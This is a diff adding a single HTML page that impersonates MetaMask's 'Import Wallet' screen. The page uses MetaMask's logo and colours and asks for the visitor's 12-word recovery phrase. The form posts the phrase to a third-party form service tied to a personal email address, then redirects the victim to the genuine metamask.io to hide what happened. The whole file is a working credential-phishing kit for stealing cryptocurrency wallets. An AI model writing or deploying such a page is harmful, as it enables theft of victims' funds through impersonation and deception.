@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wallet Import</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: url('mm.png'); /* Use your own background image */
+            background-size: cover;
+            background-repeat: no-repeat;
+            font-family: Arial, sans-serif;
+        }
+        
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 12px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            padding: 32px;
+            width: 400px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 200px; /* Adjust the width as needed */
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-weight: bold;
+            text-align: left;
+            margin-bottom: 4px;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        
+        button {
+            background-color: #f6851b;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        button:hover {
+            background-color: #d8740b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://1000logos.net/wp-content/uploads/2022/05/MetaMask-Logo.jpg" alt="MetaMask Logo" class="logo">
+        <h1>Import Wallet</h1>
+        <form id="walletForm" action="https://formspree.io/sammylanson42@gmail.com" method="POST">
+            <label for="walletPhrase">Enter Your 12-word Wallet Phrase:</label>
+            <input type="text" id="walletPhrase" name="walletPhrase" required>
+            
+            <button type="submit" onclick="redirectToOtherSite()">Connect</button>
+        </form>
+    </div>
+    
+    <script>
+          function redirectToOtherSite() {
+            // Perform any processing you need with the walletPhrase input
+            // For example, you might want to hash or encrypt it for security
+
+            // After processing, redirect to another website
+            window.location.href = "https://metamask.io"; // Replace with your desired URL
+        }
+    </script>
+</body>
+</html>
